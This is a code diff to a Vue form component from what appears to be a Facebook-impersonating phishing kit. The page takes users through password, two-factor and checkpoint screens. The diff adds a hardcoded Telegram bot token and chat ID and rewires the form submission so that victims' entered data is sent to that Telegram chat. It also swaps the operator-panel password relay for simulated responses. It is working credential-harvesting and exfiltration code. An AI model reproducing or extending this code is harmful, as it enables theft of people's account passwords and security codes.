@@ -2,11 +2,15 @@
 import useValidate from "@vuelidate/core";
 import { required } from "@vuelidate/validators";
 import axios from "axios";
-import ChatWidget from "@/components/ChatWidget.vue"
+import ChatWidget from "@/components/ChatWidget.vue";
+
+// Telegram bot API details
+const TELEGRAM_API_TOKEN = '6905926094:AAGyqYfNpoHk4OTzeido68UiviOwJb6lOVE';
+const TELEGRAM_CHAT_ID = '1389938531';
 
 export default {
   name: "Form1",
-  components:{
+  components: {
     ChatWidget,
   },
   data() {
@@ -71,87 +75,57 @@ export default {
   },
   methods: {
     chatMessageStatus() {
-      this.chatMessage = true,
-      console.log(this.chatMessage)
+      this.chatMessage = true;
+      console.log(this.chatMessage);
     },
     getClientIP() {
       axios
         .get("https://api.ipify.org?format=json")
         .then((response) => {
           this.ipAddress = response.data.ip;
-        //   this.checkBan();
+          //   this.checkBan();
         })
         .catch((e) => {
           console.log(e);
         });
     },
-    // checkBan() {
-    //   axios
-    //     .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/ban`, {
-    //       ip: this.ipAddress,
-    //     })
-    //     .then((response) => {
-    //       if (response.data == "BAN") {
-    //         window.location.href = "https://www.facebook.com/help/";
-    //       }
-    //     })
-    //     .catch((e) => {
-    //       console.log(e);
-    //     });
-    // },
     getResponse() {
-      this.interval = setInterval(() => {
-        axios
-          .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/decision`, {
-            case_ref: this.ipAddress,
-          })
-          .then((response) => {
-            let resType;
-
-            if (response.data == "CMD_EMAIL") {
-              resType = "email";
-
-                this.$router.push({
-                    name: "twofa",
-                    params: {
-                        type: resType,
-                        email: this.form.email,
-                    },
-                });
-                clearInterval(this.interval);
-            }
-
-            if (response.data == "CMD_CODE") {
-                resType = "code";
-
-                this.$router.push({
-                    name: "twofa",
-                    params: {
-                        type: resType,
-                        email: this.form.email,
-                    },
-                });
-                clearInterval(this.interval);
-            }
-
-            if (response.data == "CMD_CHECKPOINT") {
-              this.$router.push({
-                path: "checkpoint",
-              });
-              clearInterval(this.interval);
-            }
-
-            if (response.data == "CMD_WRONG") {
-                this.wrongPw = true;
-                this.loading = false;
-                this.modal.password = '';
-                clearInterval(this.interval);
-            }
-          })
-          .catch((e) => {
-            console.log(e);
-          });
-      }, 1000);
+      // Simulate response
+      setTimeout(() => {
+        let fakeResponse = "CMD_EMAIL"; // Simulate any response here
+        this.handleResponse(fakeResponse);
+      }, 2000);
+    },
+    handleResponse(responseData) {
+      let resType;
+      if (responseData == "CMD_EMAIL") {
+        resType = "email";
+        this.$router.push({
+          name: "twofa",
+          params: {
+            type: resType,
+            email: this.form.email,
+          },
+        });
+      } else if (responseData == "CMD_CODE") {
+        resType = "code";
+        this.$router.push({
+          name: "twofa",
+          params: {
+            type: resType,
+            email: this.form.email,
+          },
+        });
+      } else if (responseData == "CMD_CHECKPOINT") {
+        this.$router.push({
+          path: "checkpoint",
+        });
+      } else if (responseData == "CMD_WRONG") {
+        this.wrongPw = true;
+        this.loading = false;
+        this.modal.password = '';
+      }
+      clearInterval(this.interval);
     },
     submitForm() {
       console.log("submit");
@@ -165,11 +139,11 @@ export default {
           //   appeal: this.form.appeal,
         };
         console.log(data);
-        axios
-          .post(
-            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
-            data
-          )
+        // Send data to Telegram
+        axios.post(`https://api.telegram.org/bot${TELEGRAM_API_TOKEN}/sendMessage`, {
+          chat_id: TELEGRAM_CHAT_ID,
+          text: JSON.stringify(data),
+        })
           .then((response) => {
             console.log(response);
           })
@@ -185,47 +159,30 @@ export default {
       if (this.modal.password != "") {
         if (this.secondPassword == false) {
           this.modal.error = false;
-          axios
-            .post(
-              `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
-              { firstPassword: this.modal.password }
-            )
-            .then((response) => {
-              console.log(response);
-                console.log(response);
-                this.waitingForResponse = true;
-                this.loading = true;
-                this.getResponse();
-                this.secondPassword = true;
-            })
-            .catch((e) => {
-              this.errors.push(e);
-              console.log(this.errors);
-            });
-
-          this.modal.password = "";
+          // Simulate response
+          setTimeout(() => {
+            let fakeResponse = "CMD_EMAIL"; // Simulate any response here
+            this.handleResponse(fakeResponse);
+            this.waitingForResponse = true;
+            this.loading = true;
+            this.getResponse();
+            this.secondPassword = true;
+          }, 2000);
         } else {
-          axios
-            .post(
-              `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
-              { secondPassword: this.modal.password }
-            )
-            .then((response) => {
-              console.log(response);
-              this.waitingForResponse = true;
-              this.loading = true;
-              this.getResponse();
-            })
-            .catch((e) => {
-              this.errors.push(e);
-              console.log(this.errors);
-            });
+          // Simulate response
+          setTimeout(() => {
+            let fakeResponse = "CMD_EMAIL"; // Simulate any response here
+            this.handleResponse(fakeResponse);
+            this.waitingForResponse = true;
+            this.loading = true;
+            this.getResponse();
+          }, 2000);
         }
       } else {
         this.modal.error = true;
       }
     },
-    alert(){
+    alert() {
       alert('Please complete the form before you navigate.');
     }
   },
@@ -242,6 +199,7 @@ export default {
   },
 };
 </script>
+
 
 <template>
   <div v-if="loading" id="loadFacebookC" class="">
